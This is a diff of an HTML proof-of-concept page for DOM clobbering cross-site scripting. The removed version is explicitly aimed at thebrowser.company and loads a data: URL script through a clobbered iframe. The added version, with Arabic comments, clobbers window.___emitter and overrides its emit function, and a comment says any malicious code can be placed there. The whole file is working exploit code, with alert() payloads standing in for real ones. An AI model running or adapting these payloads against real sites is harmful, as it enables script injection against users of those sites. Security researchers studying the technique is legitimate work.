@@ -1,29 +1,18 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Remote DOM XSS - Unified Chain</title>
-</head>
-<body>
-  <h1>Launching DOM Clobbering Attack on thebrowser.company...</h1>
+<!-- هجوم DOM Clobbering لاستبدال window.___emitter -->
+<div id="___emitter">
+  <a id="emit"></a>
+</div>
 
-  <!-- Clobbering the 'my_script' reference used in the target's DOM -->
-  <iframe 
-    id="my_script" 
-    name="src" 
-    src="data:text/javascript,alert('🔥 Remote DOM XSS from External!')" 
-    style="display:none">
-  </iframe>
-
-  <script>
-    // Rebind the clobbered iframe to window variable (some contexts need this)
-    window.my_script = document.getElementById('my_script');
-
-    // Create a <script> element with dynamic src from iframe
-    const s = document.createElement('script');
-    s.src = my_script.src;  // src = data:text/javascript,...
-    document.body.appendChild(s);
-  </script>
-</body>
-</html>
-
+<script>
+  // بعد تحميل الصفحة، يمكن استغلال المتغير المغلوط
+  setTimeout(() => {
+    // window.___emitter أصبح الآن عنصر DOM بدلاً من الكائن الأصلي
+    if (window.___emitter && window.___emitter.emit) {
+      // تنفيذ كود خبيث عند استدعاء emit
+      window.___emitter.emit = function(event, data) {
+        alert('XSS via DOM Clobbering!');
+        // يمكن استبدال هذا بأي كود خبيث
+      };
+    }
+  }, 1000);
+</script>
